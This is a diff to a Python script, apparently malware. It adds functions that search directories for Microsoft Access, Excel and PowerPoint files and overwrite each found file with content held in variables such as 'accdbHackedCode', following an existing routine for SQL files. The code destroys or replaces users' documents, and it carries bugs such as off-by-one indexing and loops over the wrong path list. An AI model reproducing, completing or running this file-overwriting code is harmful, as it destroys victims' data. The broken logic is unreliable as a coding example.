@@ -170,6 +170,53 @@ def populateSQL():
         SQLFile.write(sqlHackedCode)
         SQLFile.close()
 
+# Microsoft Office File Types
+
+def findACCDB():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredACCDB = fnmatch.filter(filesInsideDir, '*.accdb')
+    filteredACCDB.extend(fnmatch.filter(filesInsideDir, '*.mdb'))
+    if len(filteredACCDB) > 0:
+        for k in range(len(filteredACCDB)):
+            pathsToACCDB.append(dirNameOfDir + "\\" + filteredACCDB[k - 1])
+        populateACCDB()
+def populateACCDB():
+    for l in range(len(pathsToACCDB)):
+        ACCDBFile = open(pathsToACCDB[l - 1], "w")
+        ACCDBFile.write(accdbHackedCode)
+        ACCDBFile.close()
+
+def findXLSX():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredXLSX = fnmatch.filter(filesInsideDir, '*.xlsx')
+    filteredXLSX.extend(fnmatch.filter(filesInsideDir, '*.xls'))
+    if len(filteredXLSX) > 0:
+        for k in range(len(filteredXLSX)):
+            pathsToXLSX.append(dirNameOfDir + "\\" + filteredXLSX[k - 1])
+        populateXLSX()
+def populateXLSX():
+    for l in range(len(pathsToACCDB)):
+        XLSXFile = open(pathsToXLSX[l - 1], "w")
+        XLSXFile.write(xlsxHackedCode)
+        XLSXFile.close()
+
+def findPPTX():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredPPTX = fnmatch.filter(filesInsideDir, '*.pptx')
+    filteredPPTX.extend(fnmatch.filter(filesInsideDir, '*.ppt'))
+    if len(filteredPPTX) > 0:
+        for k in range(len(filteredPPTX)):
+            pathsToPPTX.append(dirNameOfDir + "\\" + filteredPPTX[k - 1])
+        populatePPTX()
+def populatePPTX():
+    for l in range(len(pathsToACCDB)):
+        PPTXFile = open(pathsToPPTX[l - 1], "w")
+        PPTXFile.write(pptxHackedCode)
+        PPTXFile.close()
+
 def findDOCX():
     filesInsideDir = listOfAvailDirs[j][3][1]
     dirNameOfDir = listOfAvailDirs[j][1][1]
